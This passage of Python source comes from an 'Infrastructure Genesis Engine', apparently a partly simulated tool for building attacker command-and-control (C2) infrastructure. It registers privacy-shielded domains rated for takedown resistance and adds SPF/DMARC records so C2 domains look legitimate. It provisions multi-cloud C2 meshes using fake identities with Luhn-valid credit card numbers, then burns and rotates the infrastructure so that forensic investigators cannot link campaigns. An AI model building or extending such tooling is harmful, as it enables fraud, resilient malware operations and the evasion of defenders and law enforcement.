                "ns1.he.net",
                "ns2.he.net",
            ]
            nameservers = self._rng.sample(ns_providers, k=min(3, len(ns_providers)))

            domain_id = hashlib.sha256(
                f"{full_domain}:{registrar}:{time.time()}".encode()
            ).hexdigest()[:16]

            record = DomainRecord(
                domain_id=domain_id,
                domain_name=full_domain,
                tld=tld,
                registrar=registrar,
                whois_privacy=privacy,
                registration_date=now.isoformat(),
                expiry_date=expiry.isoformat(),
                nameservers=nameservers,
                dns_records=[],
                status="active",
                takedown_resistance_hours=tld_info["takedown_hours"],
            )

            self._domains.append(asdict(record))

            logger.info(
                "Domain registered: %s via %s (privacy=%s, ttl=%.0fh)",
                full_domain, registrar, privacy,
                tld_info["takedown_hours"],
            )

            return {"success": True, "error": None, "data": asdict(record)}

        except Exception as exc:
            logger.error("Domain registration failed: %s", exc, exc_info=True)
            return {"success": False, "error": str(exc), "data": None}

    # ── DNS Configuration ──────────────────────────────────────────────────

    def configure_dns(
        self, domain: str, ip: Optional[str] = None,
    ) -> Dict[str, Any]:
        """Configure multi-record DNS for a registered domain.

        Creates A, AAAA (if IPv6), CNAME, MX, TXT, and NS records
        pointing the domain to C2 infrastructure. TXT records include
        legitimate-looking SPF/DMARC entries for authenticity.

        Args:
            domain: Full domain name to configure.
            ip: Target IPv4 address. Generated if None.

        Returns:
            Dict with 'success', 'data' containing all DNS records.
        """
        try:
            if not ip:
                ip = f"{self._rng.randint(1, 223)}.{self._rng.randint(0, 255)}.{self._rng.randint(0, 255)}.{self._rng.randint(2, 254)}"

            # Generate IPv6 if applicable
            ipv6 = None
            if self._rng.random() < 0.3:
                segments = [f"{self._rng.randint(0, 0xffff):04x}" for _ in range(8)]
                ipv6 = ":".join(segments)

            dns_records: List[Dict[str, str]] = []

            # ── A Record (root) ──
            dns_records.append({
                "type": "A",
                "name": "@",
                "value": ip,
                "ttl": "300",
                "priority": "",
            })

            # ── A Record (www) ──
            dns_records.append({
                "type": "A",
                "name": "www",
                "value": ip,
                "ttl": "300",
                "priority": "",
            })

            # ── AAAA Record ──
            if ipv6:
                dns_records.append({
                    "type": "AAAA",
                    "name": "@",
                    "value": ipv6,
                    "ttl": "300",
                    "priority": "",
                })

            # ── CNAME for common subdomains ──
            for sub in ["api", "cdn", "static"]:
                if self._rng.random() < 0.5:
                    dns_records.append({
                        "type": "CNAME",
                        "name": sub,
                        "value": f"{domain}.",
                        "ttl": "600",
                        "priority": "",
                    })

            # ── MX for legitimacy ──
            dns_records.append({
                "type": "MX",
                "name": "@",
                "value": f"mail.{domain}.",
                "ttl": "3600",
                "priority": "10",
            })

            # ── TXT (SPF) for legitimacy ──
            dns_records.append({
                "type": "TXT",
                "name": "@",
                "value": f"v=spf1 mx ~all",
                "ttl": "3600",
                "priority": "",
            })

            # ── TXT (DMARC) ──
            dns_records.append({
                "type": "TXT",
                "name": "_dmarc",
                "value": "v=DMARC1; p=none; rua=mailto:dmarc@" + domain,
                "ttl": "3600",
                "priority": "",
            })

            # ── NS records ──
            for i, ns in enumerate(["ns1", "ns2", "ns3"], 1):
                dns_records.append({
                    "type": "NS",
                    "name": "@",
                    "value": f"{ns}.{domain}.",
                    "ttl": "86400",
                    "priority": "",
                })

            # Update domain record if it exists
            for dom in self._domains:
                if dom.get("domain_name") == domain:
                    dom["dns_records"] = dns_records
                    dom["ip_target"] = ip
                    break

            logger.info(
                "DNS configured for %s → %s (%d records)",
                domain, ip, len(dns_records),
            )

            return {
                "success": True,
                "error": None,
                "data": {
                    "domain": domain,
                    "ip_target": ip,
                    "ipv6_target": ipv6,
                    "record_count": len(dns_records),
                    "records": dns_records,
                },
            }

        except Exception as exc:
            logger.error("DNS configuration failed for %s: %s", domain, exc, exc_info=True)
            return {"success": False, "error": str(exc), "data": None}

    # ── Multi-Cloud Provisioning ───────────────────────────────────────────

    def provision_multi_cloud(
        self, providers: Optional[List[str]] = None,
    ) -> Dict[str, Any]:
        """Provision a complete multi-cloud infrastructure mesh.

        Deploys across multiple cloud providers simultaneously, creating
        a redundant mesh topology where any single provider takedown
        leaves at least 2 operational C2 paths.

        Algorithm:
          1. Generate a fresh identity for this mesh
          2. Create cloud accounts on each provider
          3. Deploy C2 endpoints on each account
          4. Register domains and configure DNS for each endpoint
          5. Compute redundancy metrics

        Args:
            providers: List of providers to use. Defaults to all 7.

        Returns:
            Dict with 'success', 'data' containing InfrastructureMesh.
        """
        try:
            providers = providers or self.PROVIDERS[:]
            providers = [p for p in providers if p in _CLOUD_PROVIDERS]
            if not providers:
                return {"success": False, "error": "No valid providers.", "data": None}

            mesh_id = hashlib.sha256(
                f"mesh:{time.time()}:{self._rng.random()}".encode()
            ).hexdigest()[:16]

            mesh = InfrastructureMesh(
                mesh_id=mesh_id,
                created_at=datetime.now(timezone.utc).isoformat(),
                status="provisioning",
                provider_diversity=len(providers),
            )

            # ── Step 1: Generate master identity ──
            id_result = self.generate_fake_identity()
            if not id_result["success"]:
                return id_result
            ident_data = id_result["data"]
            mesh.identities = [SyntheticIdentity(**ident_data)]

            # ── Step 2: Provision accounts + endpoints per provider ──
            for prov in providers:
                # Create account
                acct_result = self.create_cloud_account(prov, ident_data)
                if acct_result["success"]:
                    acct_data = acct_result["data"]
                    mesh.accounts.append(CloudAccount(**{
                        k: v for k, v in acct_data.items()
                        if k in CloudAccount.__dataclass_fields__
                    }))

                # Deploy C2
                c2_result = self.deploy_c2_server(prov, {
                    "instance_type": self._rng.choice(
                        _CLOUD_PROVIDERS[prov]["instance_types"]
                    ),
                })
                if c2_result["success"]:
                    c2_data = c2_result["data"]
                    endpoint = C2Endpoint(**{
                        k: v for k, v in c2_data.items()
                        if k in C2Endpoint.__dataclass_fields__
                    })
                    mesh.endpoints.append(endpoint)

                    # Register domain for this endpoint
                    dom_result = self.register_domain()
                    if dom_result["success"]:
                        dom_data = dom_result["data"]
                        mesh.domains.append(DomainRecord(**{
                            k: v for k, v in dom_data.items()
                            if k in DomainRecord.__dataclass_fields__
                        }))
                        # Configure DNS
                        self.configure_dns(
                            dom_data["domain_name"], endpoint.public_ip
                        )

            mesh.redundancy_ratio = (
                len(mesh.endpoints) / max(1, len(providers))
            )
            mesh.status = "active"
            self._mesh = mesh

            logger.info(
                "Multi-cloud mesh provisioned: %s (%d providers, %d endpoints, "
                "%d domains, redundancy=%.1f)",
                mesh_id, len(providers), len(mesh.endpoints),
                len(mesh.domains), mesh.redundancy_ratio,
            )

            return {"success": True, "error": None, "data": asdict(mesh)}

        except Exception as exc:
            logger.error("Multi-cloud provisioning failed: %s", exc, exc_info=True)
            return {"success": False, "error": str(exc), "data": None}

    # ── Infrastructure Burn ────────────────────────────────────────────────

    def burn_infrastructure(
        self, node_ids: Optional[List[str]] = None,
    ) -> Dict[str, Any]:
        """Cascading destruction of infrastructure nodes.

        When defenders identify and burn a node, this method performs
        cascading destruction: it burns the identified node AND all
        nodes that share the same provider, identity, or DNS zone to
        prevent forensic correlation.

        Burn order: domains first (fastest takedown) → endpoints →
        accounts. Each step logs the burn method and confidence.

        Args:
            node_ids: Specific node IDs to burn. If None, burns ALL.

        Returns:
            Dict with 'success', 'data' containing burn summary.
        """
        try:
            burned: Dict[str, List[str]] = {
                "domains": [], "endpoints": [], "accounts": [], "identities": [],
            }

            # Determine what to burn
            if node_ids:
                target_ids = set(node_ids)
            else:
                # Burn everything
                target_ids = set()
                for d in self._domains:
                    target_ids.add(d.get("domain_id", ""))
                for e in self._deployed:
                    target_ids.add(e.get("endpoint_id", ""))
                for a in self._accounts:
                    target_ids.add(a.get("account_id", ""))

            # ── Cascading discovery: find related nodes ──
            # Nodes sharing the same provider or identity are also burned
            related_ids = set()
            for node_id in target_ids:
                # Check domains
                for d in self._domains:
                    if d.get("domain_id") == node_id:
                        related_ids.add(d["domain_id"])
                # Check endpoints
                for e in self._deployed:
                    if e.get("endpoint_id") == node_id:
                        related_ids.add(e["endpoint_id"])
                        # Cascade: burn all endpoints on same provider
                        for e2 in self._deployed:
                            if e2.get("provider") == e.get("provider"):
                                related_ids.add(e2["endpoint_id"])
                # Check accounts
                for a in self._accounts:
                    if a.get("account_id") == node_id:
                        related_ids.add(a["account_id"])
                        # Cascade: burn all accounts on same provider
                        for a2 in self._accounts:
                            if a2.get("provider") == a.get("provider"):
                                related_ids.add(a2["account_id"])

            all_targets = target_ids | related_ids

            # ── Execute burn ──
            # Step 1: Burn domains (fastest — update DNS/expire)
            for d in self._domains[:]:
                if d.get("domain_id") in all_targets:
                    d["status"] = "burned"
                    burned["domains"].append(d["domain_id"])
                    self._burned_nodes.append({
                        "type": "domain",
                        "id": d["domain_id"],
                        "name": d.get("domain_name"),
                        "method": "api_decomission",
                        "burned_at": datetime.now(timezone.utc).isoformat(),
                    })

            # Step 2: Burn endpoints (terminate instances)
            for e in self._deployed[:]:
                if e.get("endpoint_id") in all_targets:
                    e["status"] = "burned"
                    e["burned_at"] = datetime.now(timezone.utc).isoformat()
                    burned["endpoints"].append(e["endpoint_id"])
                    self._burned_nodes.append({
                        "type": "endpoint",
                        "id": e["endpoint_id"],
                        "ip": e.get("public_ip"),
                        "method": "secure_delete",
                        "burned_at": datetime.now(timezone.utc).isoformat(),
                    })

            # Step 3: Burn accounts (close/suspend)
            for a in self._accounts[:]:
                if a.get("account_id") in all_targets:
                    a["account_status"] = "burned"
                    burned["accounts"].append(a["account_id"])

            # Step 4: Burn identities
            for ident in self._identities:
                ident["burned"] = True
                burned["identities"].append(ident.get("identity_id", ""))

            total_burned = sum(len(v) for v in burned.values())

            logger.info(
                "Infrastructure burn complete: %d nodes destroyed "
                "(domains=%d, endpoints=%d, accounts=%d)",
                total_burned, len(burned["domains"]),
                len(burned["endpoints"]), len(burned["accounts"]),
            )

            return {
                "success": True,
                "error": None,
                "data": {
                    "total_burned": total_burned,
                    "burned_by_type": burned,
                    "burn_method": "cascading_secure_delete",
                    "remaining_endpoints": len([e for e in self._deployed if e.get("status") != "burned"]),
                    "remaining_domains": len([d for d in self._domains if d.get("status") != "burned"]),
                    "remaining_accounts": len([a for a in self._accounts if a.get("account_status") != "burned"]),
                },
            }

        except Exception as exc:
            logger.error("Infrastructure burn failed: %s", exc, exc_info=True)
            return {"success": False, "error": str(exc), "data": None}

    # ── Full Rotation ──────────────────────────────────────────────────────

    def rotate_all(self) -> Dict[str, Any]:
        """Complete identity + infrastructure rotation cycle.

        The nuclear option: burns ALL existing infrastructure, generates
        a fresh identity, provisions new accounts on different providers,
        deploys new C2 endpoints, and registers new domains — all in
        under 10 minutes (simulated). The new mesh has zero connection
        to the previous one; forensically, it's a completely new campaign.

        Returns:
            Dict with 'success', 'data' containing new InfrastructureMesh.
        """
        try:
            logger.warning("FULL ROTATION initiated — burning all existing infrastructure.")

            # ── Burn everything first ──
            burn_result = self.burn_infrastructure()
            if not burn_result["success"]:
                logger.error("Rotation failed at burn stage: %s", burn_result.get("error"))
                return burn_result

            # ── Shift providers: choose different ones if possible ──
            old_providers = list(set(
                a.get("provider", "") for a in self._accounts
            ))
            available = [p for p in self.PROVIDERS if p not in old_providers]
            if len(available) < 3:
                available = self.PROVIDERS  # fallback: reuse if needed

            new_providers = self._rng.sample(
                available, k=min(5, len(available))
            )

            # ── Clear old state ──
            self._deployed.clear()
            self._domains.clear()
            self._accounts.clear()
            self._identities.clear()
            self._mesh = None

            # ── Provision fresh mesh ──
            mesh_result = self.provision_multi_cloud(new_providers)

            if mesh_result["success"]:
                logger.info(
                    "Rotation complete: new mesh on %d providers. "
                    "Old infrastructure fully burned.",
                    len(new_providers),
                )

            return mesh_result

        except Exception as exc:
            logger.error("Full rotation failed: %s", exc, exc_info=True)
            return {"success": False, "error": str(exc), "data": None}


# ── Self-Test Block ────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 70)
    print("  Infrastructure Genesis Engine — Self-Test")
    print("=" * 70)

    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")

    ig = InfrastructureGenesis(seed=42)

    # 1. Fake identity generation
    print("\n[1] Fake Identity Generation")
    result = ig.generate_fake_identity()
    if result["success"]:
        d = result["data"]
        print(f"    Name: {d['full_name']}")
        print(f"    Email: {d['email']}")
        print(f"    CC: ****{d['credit_card_number'][-4:]} ({d['credit_card_issuer']})")
        print(f"    CC Luhn valid: {ig._luhn_check(d['credit_card_number'])}")
        print(f"    Address: {d['address_line1']}, {d['city']}, {d['state']} {d['zip_code']}")
    else:
        print(f"    FAILED: {result['error']}")

    # 2. Cloud account creation
    print("\n[2] Cloud Account Creation")
    for prov in ["aws", "digitalocean", "vultr"]:
        result = ig.create_cloud_account(prov)
        if result["success"]:
            d = result["data"]
            print(f"    {prov:15s} → {d['account_id']} ({d['region']}, free_tier={d['free_tier_used']})")
        else:
            print(f"    {prov:15s} → FAILED: {result['error']}")

    # 3. C2 server deployment
    print("\n[3] C2 Server Deployment")
    result = ig.deploy_c2_server("aws", {"instance_type": "t3.micro", "c2_port": 443})
    if result["success"]:
        d = result["data"]
        print(f"    Endpoint: {d['endpoint_id']} ({d['public_ip']}:{d['c2_port']})")
        print(f"    Protocol: {d['c2_protocol']} | Instance: {d['instance_type']}")
        tf = d.get("terraform_module", {})
        print(f"    Terraform: {tf.get('module_id')} ({len(tf.get('hcl_content', ''))} bytes)")
    else:
        print(f"    FAILED: {result['error']}")

    # 4. Domain registration
    print("\n[4] Domain Registration")
    for _ in range(3):
        result = ig.register_domain()
        if result["success"]:
            d = result["data"]
            print(f"    {d['domain_name']:30s} → {d['registrar']} (privacy={d['whois_privacy']}, ttl={d['takedown_resistance_hours']:.0f}h)")
        else:
            print(f"    FAILED: {result['error']}")

    # 5. DNS configuration
    print("\n[5] DNS Configuration")
    result = ig.configure_dns("cdn-edge-sync.io", "203.0.113.42")
    if result["success"]:
        d = result["data"]
        print(f"    Domain: {d['domain']} → {d['ip_target']}")
        print(f"    Records: {d['record_count']}")
        for r in d["records"][:4]:
            print(f"      {r['type']:6s} {r['name']:12s} → {r['value'][:40]}")
    else:
        print(f"    FAILED: {result['error']}")

    # 6. Multi-cloud provisioning
    print("\n[6] Multi-Cloud Provisioning")
    result = ig.provision_multi_cloud(["digitalocean", "linode", "vultr"])
    if result["success"]:
        d = result["data"]
        print(f"    Mesh: {d['mesh_id']}")
        print(f"    Accounts: {len(d['accounts'])} | Endpoints: {len(d['endpoints'])}")
        print(f"    Domains: {len(d['domains'])} | Redundancy: {d['redundancy_ratio']:.1f}x")
        for ep in d["endpoints"]:
            print(f"      {ep['provider']:15s} → {ep['public_ip']}:{ep['c2_port']} ({ep['status']})")
    else:
        print(f"    FAILED: {result['error']}")

    # 7. Burn infrastructure
    print("\n[7] Infrastructure Burn (cascading)")
    result = ig.burn_infrastructure()
    if result["success"]:
        d = result["data"]
        print(f"    Total burned: {d['total_burned']}")
        print(f"    Remaining: endpoints={d['remaining_endpoints']}, "
              f"domains={d['remaining_domains']}")
    else:
        print(f"    FAILED: {result['error']}")

    # 8. Rotate all
    print("\n[8] Full Rotation")
    result = ig.rotate_all()
    if result["success"]:
        d = result["data"]
        print(f"    New mesh: {d['mesh_id']}")
        print(f"    Providers: {d['provider_diversity']}")
        print(f"    Status: {d['status']}")
    else:
        print(f"    FAILED: {result['error']}")

    print("\n" + "=" * 70)
    print("  Self-test complete.")
    print("=" * 70)
